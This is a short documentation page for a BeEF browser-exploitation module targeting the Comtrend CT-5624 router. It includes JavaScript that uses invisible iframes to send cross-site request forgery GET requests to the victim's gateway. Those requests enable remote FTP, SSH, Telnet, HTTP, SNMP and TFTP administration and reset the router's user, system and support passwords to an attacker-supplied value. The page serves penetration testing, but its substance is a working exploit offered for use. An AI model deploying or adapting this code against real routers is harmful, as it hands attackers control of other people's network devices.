## Summary

* **Objective**: enable remote administration and change the password on a Comtrend CT-5624 router
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/comtrend_ct5624_csrf)

## Internal Working

Uses an invisible iframe with a GET request to change config

```js
  var ct5367_iframe1_<%= @command_id %> = beef.dom.createInvisibleIframe();
  ct5367_iframe1_<%= @command_id %>.setAttribute('src', gateway+'scsrvcntr.cmd?action=save&ftp=1&ftp=3&http=1&http=3&icmp=1&snmp=1&snmp=3&ssh=1&ssh=3&telnet=1&telnet=3&tftp=1&tftp=3');

  var ct5367_iframe2_<%= @command_id %> = beef.dom.createInvisibleIframe();
  ct5367_iframe2_<%= @command_id %>.setAttribute('src', gateway+'/password.cgi?usrPassword='+passwd+'&sysPassword='+passwd+'&sptPassword='+passwd);

```

## Feedback

